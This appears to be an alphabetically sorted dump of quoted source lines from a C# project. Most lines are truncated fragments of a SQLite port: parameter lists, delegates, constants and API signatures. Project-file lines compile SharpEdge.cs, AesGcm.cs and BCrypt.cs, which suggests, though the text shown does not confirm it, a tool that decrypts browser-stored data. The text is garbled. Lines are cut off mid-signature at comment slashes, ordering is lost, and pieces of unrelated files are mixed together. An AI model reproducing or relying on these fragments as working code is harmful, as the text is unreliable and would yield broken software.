"    //char sqlite3CompareAffinity(Expr pExpr, char aff2)"
"    //extern ""C"" {"
"    //int nByte,              /"
"    //int sqlite3ApiExit(sqlite3 db, int)"
"    //int sqlite3BitvecBuiltinTest(int,int"
"    //int sqlite3BtreeFactory(const sqlite3 db, const char "
"    //int sqlite3BtreeSetAutoVacuum(Btree , int)"
"    //int sqlite3IndexAffinityOk(Expr pExpr, char idx_affinity)"
"    //int sqlite3SchemaToIndex(sqlite3 db, Schema "
"    //int sqlite3Utf16ByteLen(const void pData, int nChar)"
"    //int sqlite3Utf8CharLen(const char pData, int nByte)"
"    //int sqlite3VdbeMemGrow(Mem pMem, int n, int preserve)"
"    //int sqlite3VdbeOpcodeHasProperty(int, int)"
"    //int sqlite3VdbeRecordCompare(int,const void"
"    //pArg, 0, xFunc, 0, 0, "
"    //ref u8[] pp,            /"
"    //ref u8[] ppFrom,        /"
"    //sqlite3_expired,"
"    //sqlite3_thread_cleanup,"
"    //sqlite3_transfer_bindings,"
"    //static     void sqlite3DbReallocOrFree(sqlite3 db, object p, int n){"
"    //static void winDlError(sqlite3_vfs pVfs, int nBuf, char "
"    //u8 pEnd,                /"
"    //void sqlite3StatusAdd(int, int)"
"    //void sqlite3StatusSet(int, int)"
"    0,                              /"
"    0,                         /"
"    0, 0,                      /"
"    0x7ffffffe,               /"
"    1,                              /"
"    1,                        /"
"    1,                /"
"    100,                      /"
"    5 N S X    Set N bits from S increment X in array only, not in bitvec"
"    500,                      /"
"    <BootstrapperPackage Include=""Microsoft.Net.Framework.3.5.SP1"">"
"    <Compile Include=""AesGcm.cs"" />"
"    <Compile Include=""BCrypt.cs"" />"
"    <Compile Include=""Program.cs"" />"
"    <Compile Include=""Properties"
"    <Compile Include=""SQLite"
"    <Compile Include=""SharpEdge.cs"" />"
"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
"    <None Include=""app.config"" />"
"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
"    <Reference Include=""System"" />"
"    <Reference Include=""System.Data"" />"
"    <Reference Include=""System.Management"" />"
"    <Reference Include=""System.Security"" />"
"    <Reference Include=""System.Xml"" />"
"    Bitmask notReady,           /"
"    Bitmask notReady,          /"
"    Bitmask notReady,     /"
"    BtCursor pCur,                /"
"    BtCursor pCur,           /"
"    BtCursor pCur,      /"
"    BtCursor pCur,     /"
"    BtCursor pCur,    /"
"    BtCursor pCur,   /"
"    BtShared pBt,               /"
"    BtShared pBt,           /"
"    BtShared pBt,          /"
"    BtShared pBt,         /"
"    BtShared pBt,        /"
"    BtShared pBt,"
"    Btree p,                                   /"
"    Btree p,                              /"
"    Btree p,       /"
"    Cmpr: Compare A, B"
"    CollSeq pColl,      /"
"    Column[] aCol,        /"
"    DbFixer pFix,       /"
"    DbFixer pFix,     /"
"    Debug.Assert( !hasReadConflicts(pBtree, iRoot) )"
"    Debug.Assert( hasSharedCacheTableLock(pBtree, iRoot, 0, WRITE_LOCK) )"
"    Expr pAuthArg,      /"
"    Expr pDbname,       /"
"    Expr pExpr,              /"
"    Expr pExpr,            /"
"    Expr pExpr,           /"
"    Expr pExpr,        /"
"    Expr pExpr,       /"
"    Expr pExpr,"
"    Expr pFilename,     /"
"    Expr pHaving,        /"
"    Expr pLeft,            /"
"    Expr pLeft,          /"
"    Expr pLeft,      /"
"    Expr pLeft,"
"    Expr pLimit,         /"
"    Expr pOn,              /"
"    Expr pRight,           /"
"    Expr pRight,         /"
"    Expr pRight,     /"
"    Expr pRoot,"
"    Expr pWhen,        /"
"    Expr pWhere,            /"
"    Expr pWhere,          /"
"    Expr pWhere,         /"
"    Expr pWhere,        /"
"    Expr pWhere,       /"
"    ExprList pChanges,     /"
"    ExprList pChanges,    /"
"    ExprList pChanges,   /"
"    ExprList pEList,       /"
"    ExprList pEList,      /"
"    ExprList pEList,     /"
"    ExprList pEList,    /"
"    ExprList pEList,   /"
"    ExprList pEList,  /"
"    ExprList pEList,"
"    ExprList pFromCol,  /"
"    ExprList pGroupBy,   /"
"    ExprList pList,          /"
"    ExprList pList,        /"
"    ExprList pList,      /"
"    ExprList pList,     /"
"    ExprList pList,   /"
"    ExprList pList,  /"
"    ExprList pOrderBy,          /"
"    ExprList pOrderBy,         /"
"    ExprList pOrderBy,     /"
"    ExprList pOrderBy,    /"
"    ExprList pOrderBy,   /"
"    ExprList pToCol,    /"
"    ExprSpan pLeft,    /"
"    ExprSpan pOperand,    /"
"    ExprSpan pOut,        /"
"    ExprSpan pOut,     /"
"    FuncDef pFunc,      /"
"    FuncDefHash pHash,  /"
"    Hash pH,              /"
"    Hash pH,            /"
"    Hash pH,       /"
"    IdList pColumn,      /"
"    IdList pColumn,    /"
"    IdList pColumns,   /"
"    Index pIdx,            /"
"    Index pIdx,       /"
"    InitData pData, /"
"    IntegrityCk pCheck,    /"
"    IntegrityCk pCheck,  /"
"    IntegrityCk pCheck,"
"    KeyInfo pKeyInfo,                          /"
"    KeyInfo pKeyInfo,                     /"
"    KeyInfo pKeyInfo,      /"
"    KeyInfo pKeyInfo,   /"
"    MAX_PATH,                       /"
"    May you share freely, never taking more than you give."
"    Mem pMem,           /"
"    Mem pRec,          /"
"    MemPage pDbPage,        /"
"    MemPage pPage,            /"
"    MemPage pPage,         /"
"    MemPage pPage,        /"
"    MemPage pPage,      /"
"    MemPage pPage,    /"
"    MemPage pParent,               /"
"    NameContext pNC,       /"
"    NameContext pNC,     /"
"    NameContext pNC,    /"
"    NameContext pNC,"
"    PCache pCache,       /"
"    PCache1 pCache,"
"    Pager pPager,                         /"
"    Pager pPager,                /"
"    Pager pPager,               /"
"    Pager pPager,           /"
"    Pager pPager,         /"
"    Pager pPager,       /"
"    Pager pPager,      /"
"    Parse p,       /"
"    Parse pParse,               /"
"    Parse pParse,              /"
"    Parse pParse,             /"
"    Parse pParse,            /"
"    Parse pParse,           /"
"    Parse pParse,          /"
"    Parse pParse,         /"
"    Parse pParse,        /"
"    Parse pParse,       /"
"    Parse pParse,      /"
"    Parse pParse,     /"
"    Parse pParse,    /"
"    Parse pParse,   /"
"    Parse pParse,"
"    PgHdr pPg,"
"    Pgno iChild,           /"
"    Pgno iChild,        /"
"    Pgno iFreePage,          /"
"    Pgno iParent,          /"
"    Pgno iPtrPage,           /"
"    Pgno nearby,"
"    Pgno ovfl,                  /"
"    Pgno pgno,             /"
"    Pgno pgno,            /"
"    Pgno pgno,           /"
"    RowSetEntry pA,    /"
"    RowSetEntry pIn,            /"
"    SQLITE_DEFAULT_MEMSTATUS, /"
"    SQLITE_THREADSAFE == 1,   /"
"    Select p,                 /"
"    Select p,              /"
"    Select p,             /"
"    Select p,            /"
"    Select p,           /"
"    Select p,         /"
"    Select p,        /"
"    Select pSelect,       /"
"    Select pSelect,      /"
"    Select pSelect,    /"
"    Select pSelect,   /"
"    Select pSubquery,      /"
"    SelectDest pDest,      /"
"    SelectDest pDest,   /"
"    SelectDest pIn,        /"
"    SrcList p,             /"
"    SrcList pList,     /"
"    SrcList pSrc,             /"
"    SrcList pSrc,            /"
"    SrcList pSrc,        /"
"    SrcList pSrc,     /"
"    SrcList pTabList,       /"
"    SrcList pTabList,      /"
"    SrcList pTabList,     /"
"    SrcList pTabList,    /"
"    SrcList pTabList,  /"
"    SrcList pTableName,/"
"    SrcList pTblName, /"
"    SrcList_item pSrc,          /"
"    SrcList_item pSrc,         /"
"    StrAccum pAccum,             /"
"    T[] pArray,    /"
"    Table pDest,          /"
"    Table pTab,            /"
"    Table pTab,          /"
"    Table pTab,         /"
"    Table pTab,       /"
"    Table pTab,      /"
"    Table pTab,     /"
"    Table pTab,    /"
"    Table pTab1,          /"
"    Table pTab2,          /"
"    Table pView,       /"
"    Token pAlias,          /"
"    Token pBegin,     /"
"    Token pCons,           /"
"    Token pDatabase,       /"
"    Token pEnd,            /"
"    Token pEnd,       /"
"    Token pId1,        /"
"    Token pId2,        /"
"    Token pName,           /"
"    Token pName1,      /"
"    Token pName1,     /"
"    Token pName1,   /"
"    Token pName2,      /"
"    Token pName2,     /"
"    Token pName2,   /"
"    Token pStart,     /"
"    Token pTable,          /"
"    Token pTable,      /"
"    Token pTableName,      /"
"    Token pTableName,   /"
"    Token pTableName,  /"
"    Token pTo,          /"
"    Token pToken,         /"
"    Token pValue,      /"
"    Trigger pTrigger,    /"
"    TriggerStep pStepList,   /"
"    TriggerStep pStepList, /"
"    UnpackedRecord pIdxKey,  /"
"    UnpackedRecord pSpace, //  char "
"    UnpackedRecord pUnpacked,   /"
"    Vdbe p,                        /"
"    Vdbe p,                 /"
"    Vdbe p,               /"
"    Vdbe v,           /"
"    Vdbe v,          /"
"    VdbeCursor pC,              /"
"    WHERE  a=='hello' AND coalesce(b,11)<10 AND (c"
"    WhereClause pWC,            /"
"    WhereClause pWC,           /"
"    WhereClause pWC,         /"
"    WhereClause pWC,        /"
"    WhereClause pWC,     /"
"    WhereInfo pWInfo,     /"
"    WhereLevel pLevel,   /"
"    WhereLevel pLevel, /"
"    WhereMaskSet pMaskSet,   /"
"    WhereMaskSet pMaskSet, /"
"    WhereTerm pTerm,   /"
"    YYCODETYPE yymajor,    /"
"    YYFALLBACK         If defined, this indicates that one or more tokens"
"    [DllImport( ""kernel32.dll"" )]"
"    _ht pEntry,           /"
"    aVTrans = sqlite3DbRealloc(db, (void "
"    addModuleArgument(db, pParse->pNewTable, sqlite3DbStrNDup(db, z, n))"
"    always preferred, even if the affinity is REAL, because"
"    bool appendBias,    /"
"    bool bPurgeable,             /"
"    bool isAgg,          /"
"    bool isUpdate,      /"
"    bool key,         /"
"    bool omitJournal,     /"
"    bool rowidChng,     /"
"    byte[] buf,         /"
"    byte[] buf,     /"
"    byte[] pBuf,               /"
"    byte[] pBuf,              /"
"    byte[] pBuf,           /"
"    byte[] pBuf,        /"
"    byte[] pCell,             /"
"    byte[] pCell,         /"
"    byte[] pData, int nData,      /"
"    byte[] pData, int nData,  /"
"    byte[] pKey,        /"
"    byte[] pKey,       /"
"    byte[] pKey, i64 nKey,        /"
"    byte[] pKey, i64 nKey,    /"
"    byte[] pPayload,           /"
"    byte[] zBuf,           /"
"    byte[] zBuf,          /"
"    byte[] zIn, ref int iz )"
"    char affinity,              /"
"    char affinity,      /"
"    char affinity,"
"    compareInfo pInfo,          /"
"    const string MASTER_NAME = ""sqlite_master"""
"    const string SQLITE_FILE_HEADER = ""SQLite format 3"
"    const string SQLITE_TEMP_FILE_PREFIX = ""etilqs_"""
"    const string SQLITE_VERSION = ""3.6.17.C"
"    const string TEMP_MASTER_NAME = ""sqlite_temp_master"""
"    date( TIMESTRING, MOD, MOD, ...)"
"    datetime( TIMESTRING, MOD, MOD, ...)"
"    dxBusy xBusy,"
"    dxBusyHandler xBusyHandler,           /"
"    dxColname xFunc,"
"    dxCommitCallback xCallback,   //int ("
"    dxCompare xCompare, //int("
"    dxCompare xCompare,//)(void"
"    dxDel xDel,           /"
"    dxFunc xFunc, //)(sqlite3_context"
"    dxProfile xProfile,//void ("
"    dxProgress xProgress, //int (xProgress)(void"
"    dxRollbackCallback xCallback,   //void ("
"    dxStep xStep,//)(sqlite3_context"
"    dxStress xStress,//int ("
"    dxUpdateCallback xCallback,   //void ("
"    dxalarmCallback xCallback, //void("
"    encoding is requested, or vice versa."
"    false,                     /"
"    i64 intKey,              /"
"    i64 journalSize,            /"
"    i64 nKey,          /"
"    iDb = sqlite3SchemaToIndex(db, pTab->pSchema)"
"    if( sqlite3_test_control(SQLITE_TESTCTRL_ALWAYS, 2)==2 ){"
"    int N,                /"
"    int N,             /"
"    int N,"
"    int NoCallback, int NoArgs, int NoErrors"
"    int NotUsed,                /"
"    int NotUsed,"
"    int _base,             /"
"    int addrRepeat,    /"
"    int amt,                   /"
"    int amt,                  /"
"    int amt,          /"
"    int appendBias,                /"
"    int argc,"
"    int autoInc,    /"
"    int baseCur,        /"
"    int baseCur,    /"
"    int bias,          /"
"    int biasRight,           /"
"    int createFlag,      /"
"    int dest,         /"
"    int distinct,          /"
"    int eOp,                   /"
"    int enc,                   /"
"    int enc,"
"    int flags,               /"
"    int flags,              /"
"    int flags,"
"    int freePageFlag,     /"
"    int h,              /"
"    int i,                 /"
"    int i,                /"
"    int i,              /"
"    int i,"
"    int iAmt,              /"
"    int iAmt,             /"
"    int iArg,"
"    int iCell,              /"
"    int iCell,             /"
"    int iCell,            /"
"    int iCol,             /"
"    int iColumn,          /"
"    int iColumn,      /"
"    int iContinue,         /"
"    int iCur,             /"
"    int iCur,          /"
"    int iCur,         /"
"    int iCur,       /"
"    int iDb,              /"
"    int iDb,            /"
"    int iDb,        /"
"    int iFirst,               /"
"    int iFrom,           /"
"    int iLevel,           /"
"    int iPage,            /"
"    int iParentIdx,                /"
"    int iReg,         /"
"    int iRightJoinTable,  /"
"    int iRowid,        /"
"    int iStatCur,       /"
"    int iStatCur,    /"
"    int iTab,          /"
"    int iTable,                                /"
"    int iTable,                           /"
"    int iTable,          /"
"    int iTable,        /"
"    int iTable,       /"
"    int idx,                /"
"    int ignoreDest,     /"
"    int ignoreJump,      /"
"    int in1, int in2, /"
"    int initSize,     /"
"    int isDistinct,       /"
"    int isFreeList,       /"
"    int isHot,"
"    int isMainJrnl,              /"
"    int isSavepnt,               /"
"    int isTemp,        /"
"    int isTemp,      /"
"    int isUnsync,                /"
"    int isView,       /"
"    int isView,      /"
"    int isVirtual,   /"
"    int mxErr,     /"
"    int n,                  /"
"    int n,               /"
"    int n,              /"
"    int n,"
"    int nArg,             /"
"    int nArg,"
"    int nBytes,               /"
"    int nBytes,           /"
"    int nCache,           /"
"    int nCell,        /"
"    int nCol,             /"
"    int nColumn,           /"
"    int nColumn,      /"
"    int nCursor,                   /"
"    int nData,            /"
"    int nData,"
"    int nEqCol,            /"
"    int nExtra,              /"
"    int nExtra,        /"
"    int nField,           /"
"    int nFull,                    /"
"    int nKey,           /"
"    int nKey,      /"
"    int nKey1, byte[] pKey1,    /"
"    int nKey1, string pKey1,"
"    int nKey2, string pKey2"
"    int nMem,                      /"
"    int nName,            /"
"    int nOps,"
"    int nPathOut,"
"    int nRoot,     /"
"    int nVar,                      /"
"    int nZero,                     /"
"    int nZero,                /"
"    int newIdx,          /"
"    int newIdx,         /"
"    int offset,         /"
"    int offset,       /"
"    int offset,"
"    int oldIdx,          /"
"    int onError,          /"
"    int onError,      /"
"    int onError,     /"
"    int op,                 /"
"    int op,                /"
"    int op,               /"
"    int op,              /"
"    int op,             /"
"    int op,            /"
"    int opcode,       /"
"    int orconf,          /"
"    int overrideError,  /"
"    int p4type,            /"
"    int rMayHaveNull,      /"
"    int regOut,       /"
"    int regPrev,           /"
"    int regReturn,         /"
"    int regRowid,       /"
"    int saveSqlFlag,          /"
"    int saveSqlFlag,         /"
"    int sortOrder,    /"
"    int sqlite3DbMallocSize( sqlite3 db, byte[] p )"
"    int srcTab,            /"
"    int stateno,              /"
"    int sz,             /"
"    int szEntry,      /"
"    int szExtra,                 /"
"    int szPage,                  /"
"    int target,       /"
"    int tr_tm,           /"
"    int tr_tm,         /"
"    int type,           /"
"    int useExtended,             /"
"    int var,                /"
"    int vfsFlags,            /"
"    int vfsFlags,         /"
"    int wrFlag,                                /"
"    int wrFlag,                           /"
"    int yyMajor,                  /"
"    int yyNewState,               /"
"    int yymajor,                     /"
"    int yymajor,                   /"
"    int[] aRegIdx,      /"
"    int[] aRoot,   /"
"    it is legal to shift the error symbol, then shift"
"    julianday( TIMESTRING, MOD, MOD, ...)"
"    linked list is stored as the ""pTrigger"" member of the associated"
"    memcpy(zCopy, zName, nName"
"    new sqlite3_mem_methods(),   /"
"    new sqlite3_mutex_methods( null, null, null, null, null, null, null, null, null ), /"
"    new sqlite3_pcache_methods(),/"
"    null,                           /"
"    null,                        /"
"    null,                      /"
"    object NotUsed,"
"    object p,"
"    object pArg,                /"
"    object pArg,"
"    object pCollNeededArg,"
"    object pCtx,"
"    object pStress,              /"
"    object pUserData,"
"    object padFlag,"
"    object ptr,               /"
"    p1, p2, p3      Operands"
"    pVTab = sqlite3GetVTable(db, pTab)"
"    prefers UTF-16LE when UTF-16BE is requested, or vice versa."
"    prefers UTF-8 when a UTF-16 encoding is requested, or vice versa."
"    private string LastError = """""
"    public SQLiteVdbe( SQLiteDatabase db, String query )"
"    public delegate  sqlite3_pcache dxPC_Create (int szPage, int bPurgeable)"
"    public delegate  void dxPC_Cachesize (sqlite3_pcache pCache, int nCachesize)"
"    public delegate HANDLE dxDlOpen( sqlite3_vfs vfs, string zFilename )"
"    public delegate HANDLE dxDlSym( sqlite3_vfs vfs, HANDLE data, string zSymbol )"
"    public delegate PgHdr dxPC_Fetch( sqlite3_pcache pCache, u32 key, int createFlag )"
"    public delegate bool dxCompare4( string Key1, int size1, string Key2, int size2 )"
"    public delegate byte[] dxRealloc( ref byte[] pOld, int nSize )"
"    public delegate int dmxBestIndex(sqlite3_vtab pVTab, sqlite3_index_info pIndexInfo)"
"    public delegate int dmxColumn(sqlite3_vtab_cursor pCursor, sqlite3_context ctx, int i3)"
"    public delegate int dmxConnect(sqlite3 db, object pAux, int argc, string p4, object argv, sqlite3_vtab ppVTab, char p7)"
"    public delegate int dmxCreate(sqlite3 db, object pAux, int argc, string p4, object argv, sqlite3_vtab ppVTab, char p7)"
"    public delegate int dmxFilter(sqlite3_vtab_cursor pCursor, int idmxNum, string idmxStr, int argc, sqlite3_value argv)"
"    public delegate int dmxFindFunction(sqlite3_vtab pVtab, int nArg, string zName)"
"    public delegate int dmxOpen(sqlite3_vtab pVTab, sqlite3_vtab_cursor ppCursor)"
"    public delegate int dmxRename(sqlite3_vtab pVtab, string zNew)"
"    public delegate int dmxRowid(sqlite3_vtab_cursor pCursor, sqlite3_int64 pRowid)"
"    public delegate int dmxUpdate(sqlite3_vtab pVTab, int i2, sqlite3_value sv3, sqlite3_int64 v4)"
"    public delegate int dxAccess( sqlite3_vfs vfs, string zName, int flags, ref int pResOut )"
"    public delegate int dxBusy( object pBtShared, int iValue )"
"    public delegate int dxCallback( object pCallbackArg, sqlite3_int64 argc, object p2, object p3 )"
"    public delegate int dxCheckReservedLock( sqlite3_file File_ID, ref int pRes)"
"    public delegate int dxColumn_I( sqlite3_stmt pStmt, int i )"
"    public delegate int dxCompare( object pCompareArg, int size1, string Key1, int size2, string Key2 )"
"    public delegate int dxCurrentTime( sqlite3_vfs vfs, ref double currenttime )"
"    public delegate int dxDelete( sqlite3_vfs vfs, string zName, int syncDir )"
"    public delegate int dxDlClose( sqlite3_vfs vfs, HANDLE data )"
"    public delegate int dxDlError( sqlite3_vfs vfs, int nByte, ref string zErrMsg )"
"    public delegate int dxExprCallback (Walker W, ref Expr E)"
"    public delegate int dxExprTreeFunction( ref int pArg, Expr pExpr )"
"    public delegate int dxExprTreeFunction_NC( NameContext pArg, ref Expr pExpr )"
"    public delegate int dxExprTreeFunction_OBJ( object pArg, Expr pExpr )"
"    public delegate int dxFileControl( sqlite3_file File_ID, int op, ref int pArgs )"
"    public delegate int dxFileSize( sqlite3_file File_ID, ref int size )"
"    public delegate int dxFullPathname( sqlite3_vfs vfs, string zName, int nOut, StringBuilder zOut )"
"    public delegate int dxGetLastError( sqlite3_vfs pVfs, int nBuf, ref string zBuf )"
"    public delegate int dxInit( sqlite3 db, ref string zMessage, sqlite3_api_routines sar )"
"    public delegate int dxLock( sqlite3_file File_ID, int locktype )"
"    public delegate int dxOpen( sqlite3_vfs vfs, string zName, sqlite3_file db, int flags, ref int pOutFlags )"
"    public delegate int dxRandomness( sqlite3_vfs vfs, int nByte, ref byte[] buffer )"
"    public delegate int dxRead( sqlite3_file File_ID, byte[] buffer, int amount, sqlite3_int64 offset )"
"    public delegate int dxSelectCallback (Walker W, Select S)"
"    public delegate int dxSleep( sqlite3_vfs vfs, int microseconds )"
"    public delegate int dxStress (object obj,PgHdr pPhHdr)"
"    public delegate int dxSync( sqlite3_file File_ID, int flags )"
"    public delegate int dxTruncate( sqlite3_file File_ID, sqlite3_int64 size )"
"    public delegate int dxUnlock( sqlite3_file File_ID, int locktype )"
"    public delegate int dxWrite( sqlite3_file File_ID, byte[] buffer, int amount, sqlite3_int64 offset )"
"    public delegate int smdxBestIndex( sqlite3_vtab pVTab, ref sqlite3_index_info pIndex )"
"    public delegate int smdxColumn( sqlite3_vtab_cursor pCursor, sqlite3_context p2, int p3 )"
"    public delegate int smdxConnect( sqlite3 db, object pAux, int argc, string constargv, ref sqlite3_vtab ppVTab, ref string pError )"
"    public delegate int smdxCreate( sqlite3 db, object pAux, int argc, string constargv, ref sqlite3_vtab ppVTab, ref string pError )"
"    public delegate int smdxFilter( sqlite3_vtab_cursor pCursor, int idxNum, string idxStr, int argc, sqlite3_value[] argv )"
"    public delegate int smdxFindFunction( sqlite3_vtab pVtab, int nArg, string zName, object pxFunc, ref sqlite3_value[] ppArg )"
"    public delegate int smdxOpen( sqlite3_vtab pVTab, ref sqlite3_vtab_cursor ppCursor )"
"    public delegate int smdxRename( sqlite3_vtab pVtab, string zNew )"
"    public delegate int smdxRowid( sqlite3_vtab_cursor pCursor, sqlite3_int64 pRowid )"
"    public delegate int smdxUpdate( sqlite3_vtab pVTab, int p1, sqlite3_value[] p2, sqlite3_int64 p3 )"
"    public delegate object dxColumn( sqlite3_stmt pStmt, int i )"
"    public delegate void dxAuth( object pAuthArg, int b, string c, string d, string e, string f )"
"    public delegate void dxCollNeeded( object pCollNeededArg, sqlite3 db, int eTextRep, string collationName )"
"    public delegate void dxFunc( sqlite3_context ctx, int intValue, sqlite3_value[] value )"
"    public delegate void dxPC_Rekey( sqlite3_pcache pCache, PgHdr p2, u32 oldKey, u32 newKey )"
"    public delegate void dxPC_Truncate( sqlite3_pcache pCache, u32 iLimit )"
"    public delegate void dxPC_Unpin( sqlite3_pcache pCache, PgHdr p2, int discard )"
"    public delegate void dxProfile( object pProfileArg, string msg, u64 time )"
"    public delegate void dxStep( sqlite3_context ctx, int intValue, sqlite3_value[] value )"
"    public delegate void dxTrace( object pTraceArg, string msg )"
"    public delegate void dxUpdateCallback( object pUpdateArg, int b, string c, string d, sqlite3_int64 e )"
"    public delegate void dxalarmCallback (object pData, sqlite3_int64 p1, int p2)"
"    public int BindInteger(int index, int bInteger )"
"    public int BindLong( int index, long bLong )"
"    public int BindText(  int index, string bText )"
"    public static Mem sqlite3_aggregate_context( sqlite3_context p, int nByte )"
"    public static byte[] sqlite3_column_blob( sqlite3_stmt pStmt, int i )"
"    public static double sqlite3_column_double(sqlite3_stmt pStmt, int i)"
"    public static int sqlite3_backup_step( sqlite3_backup p, int nPage )"
"    public static int sqlite3_bind_double( sqlite3_stmt pStmt, int i, double rValue )"
"    public static int sqlite3_bind_int( sqlite3_stmt p, int i, int iValue )"
"    public static int sqlite3_bind_int64( sqlite3_stmt pStmt, int i, sqlite_int64 iValue )"
"    public static int sqlite3_bind_null( sqlite3_stmt pStmt, int i )"
"    public static int sqlite3_bind_parameter_index( sqlite3_stmt pStmt, string zName )"
"    public static int sqlite3_busy_timeout( sqlite3 db, int ms )"
"    public static int sqlite3_column_int( sqlite3_stmt pStmt, int i )"
"    public static int sqlite3_column_type( sqlite3_stmt pStmt, int i )"
"    public static int sqlite3_enable_load_extension( sqlite3 db, int onoff )"
"    public static sqlite_int64 sqlite3_column_int64( sqlite3_stmt pStmt, int i )"
"    public static string sqlite3_column_decltype( sqlite3_stmt pStmt, int N )"
"    public static string sqlite3_column_name( sqlite3_stmt pStmt, int N )"
"    public static string sqlite3_column_text( sqlite3_stmt pStmt, int i )"
"    public static string sqlite3_mprintf( string zFormat, params va_list[] ap )"
"    public static string sqlite3_snprintf( int n, ref StringBuilder zBuf, string zFormat, params va_list[] ap )"
"    public static string sqlite3_snprintf( int n, ref string zBuf, string zFormat, params va_list[] ap )"
"    public static void sqlite3_result_double( sqlite3_context pCtx, double rVal )"
"    public static void sqlite3_result_error( sqlite3_context pCtx, string z, int n )"
"    rc = pMod->xFindFunction(pVtab, nArg, zLowerName, "
"    rc = sqlite3PagerPagecount( pPager, ref nMax )"
"    rc = sqlite3PcacheFetch(pPager.pPCache, pgno, 1,ref  ppPage)"
"    rc = vtabCallConstructor(db, pTab, pMod, pMod->pModule->xConnect, "
"    rc = vtabCallConstructor(db, pTab, pMod, pMod->pModule->xCreate, pzErr)"
"    ref Btree ppBtree,      /"
"    ref DbPage ppPage, /"
"    ref Expr ppExpr,      /"
"    ref ExprList ppOrderBy, /"
"    ref HashElem elem,  /"
"    ref MemPage ppPage,         /"
"    ref MemPage ppPage,  /"
"    ref MemPage ppPage,"
"    ref Pager ppPager,       /"
"    ref Pgno pPgno,"
"    ref RowSetEntry ppFirst,    /"
"    ref RowSetEntry ppList,"
"    ref bool pisComplete, /"
"    ref i64 pOffset,             /"
"    ref int outOffset, /"
"    ref int pAmt,    /"
"    ref int pCurrent,    /"
"    ref int pFreeLeft,   /"
"    ref int pHighwater,  /"
"    ref int pRegLeft,    /"
"    ref int pRegRight,   /"
"    ref int pnAlloc,      /"
"    ref int pnCol,             /"
"    ref int pnColumn,       /"
"    ref int pnCurrent,      /"
"    ref int pnEntry,      /"
"    ref int pnMax,          /"
"    ref int pnMin,          /"
"    ref int pnPattern,    /"
"    ref int pnRow,          /"
"    ref sqlite3 ppDb,         /"
"    ref sqlite3 ppDb,        /"
"    ref sqlite3_file pFile, /"
"    ref sqlite3_file ppFile,"
"    ref sqlite3_stmt ppStmt,  /"
"    ref sqlite3_vfs pVfs,"
"    ref string pzOriginDb,"
"    ref string pzOriginTab,"
"    ref string[] pazResult, /"
"    ref u32 pNRec,              /"
"    ref u32 piOldColMask,/"
"    requested, or vice versa."
"    sqlite3 db,                /"
"    sqlite3 db,               /"
"    sqlite3 db,              /"
"    sqlite3 db,             /"
"    sqlite3 db,            /"
"    sqlite3 db,           /"
"    sqlite3 db,          /"
"    sqlite3 db,         /"
"    sqlite3 db,        /"
"    sqlite3 db,       /"
"    sqlite3 db,"
"    sqlite3 pDestDb,                 /"
"    sqlite3 pSrcDb,                  /"
"    sqlite3AuthCheck(pParse, SQLITE_CREATE_VTABLE, pTable->zName, "
"    sqlite3BtreeHoldsMutex(db->aDb[sqlite3SchemaToIndex(db, p->pSchema)].pBt) "
"    sqlite3ChangeCookie(pParse, iDb)"
"    sqlite3DbFree(db, db->aVTrans)"
"    sqlite3DbFree(db, pDel)"
"    sqlite3DbFree(db, pTable->azModuleArg)"
"    sqlite3DbFree(db, pVTab)"
"    sqlite3DbFree(db, pVTable)"
"    sqlite3DbFree(db, zArg)"
"    sqlite3DbFree(db, zErr)"
"    sqlite3DbFree(db, zLowerName)"
"    sqlite3DbFree(db, zModuleName)"
"    sqlite3DbFree(db, zStmt)"
"    sqlite3DbFree(p->dbMem, p->azModuleArg)"
"    sqlite3Error(db, SQLITE_MISUSE, 0)"
"    sqlite3ErrorMsg(pParse, ""no such module: %s"", zModule)"
"    sqlite3NestedParse(pParse,"
"    sqlite3ResetInternalSchema(db, 0)"
"    sqlite3SrcListEnlarge(db, pSrclist, 3, 2)"
"    sqlite3StackFree(db, pParse)"
"    sqlite3VdbeAddOp2(v, OP_Expire, 0, 0)"
"    sqlite3VdbeAddOp4(v, OP_ParseSchema, iDb, 1, 0, zWhere, P4_DYNAMIC)"
"    sqlite3VdbeAddOp4(v, OP_VCreate, iDb, 0, 0, "
"    sqlite3_callback xCallback, /"
"    sqlite3_context context, /"
"    sqlite3_context context,"
"    sqlite3_context pCtx,   /"
"    sqlite3_context pCtx,"
"    sqlite3_file id,           /"
"    sqlite3_file id,          /"
"    sqlite3_file pFile, /"
"    sqlite3_file pFile,"
"    sqlite3_file pJfd,     /"
"    sqlite3_file pJfd,    /"
"    sqlite3_int64 NotUsed2,"
"    sqlite3_pcache p,"
"    sqlite3_stmt pStmt,   /"
"    sqlite3_stmt pStmt,"
"    sqlite3_value pVal,"
"    sqlite3_value v,     /"
"    sqlite3_value[] argv,"
"    sqlite3_vfs pVfs,             /"
"    sqlite3_vfs pVfs,         /"
"    sqlite3_vfs pVfs,        /"
"    sqlite3_vfs pVfs,       /"
"    sqlite3_vfs pVfs,"
"    static BenignMallocHooks sqlite3Hooks = new BenignMallocHooks( null, null )"
"    static Bitmask exprListTableUsage( WhereMaskSet pMaskSet, ExprList pList )"
"    static Bitmask exprSelectTableUsage( WhereMaskSet pMaskSet, Select pS )"
"    static Bitmask exprTableUsage( WhereMaskSet pMaskSet, Expr p )"
"    static Bitmask getMask( WhereMaskSet pMaskSet, int iCursor )"
"    static Btree findBtree( sqlite3 pErrorDb, sqlite3 pDb, string zDb )"
"    static CollSeq multiSelectCollSeq( Parse pParse, Select p, int iCol )"
"    static CollSeq sqlite3ExprCollSeq( Parse pParse, Expr pExpr )"
"    static CollSeq sqlite3LocateCollSeq( Parse pParse, string zName )"
"    static DbPage sqlite3PagerLookup( Pager pPager, u32 pgno )"
"    static Expr exprDup( sqlite3 db, Expr p, int flags, ref Expr pzBuffer )"
"    static Expr sqlite3CreateIdExpr( Parse pParse, string zName )"
"    static Expr sqlite3ExprAnd( sqlite3 db, Expr pLeft, Expr pRight )"
"    static Expr sqlite3ExprDup( sqlite3 db, Expr p, int flags )"
"    static Expr sqlite3ExprFunction( Parse pParse, ExprList pList, Token pToken )"
"    static Expr sqlite3ExprFunction( Parse pParse, ExprList pList, int null_3 )"
"    static Expr sqlite3ExprFunction( Parse pParse, int null_2, Token pToken )"
"    static Expr sqlite3ExprSetColl( Parse pParse, Expr pExpr, Token pCollName )"
"    static Expr sqlite3PExpr( Parse pParse, int op, Expr pLeft, Expr pRight, int null_5 )"
"    static Expr sqlite3PExpr( Parse pParse, int op, Expr pLeft, int null_4, Token pToken )"
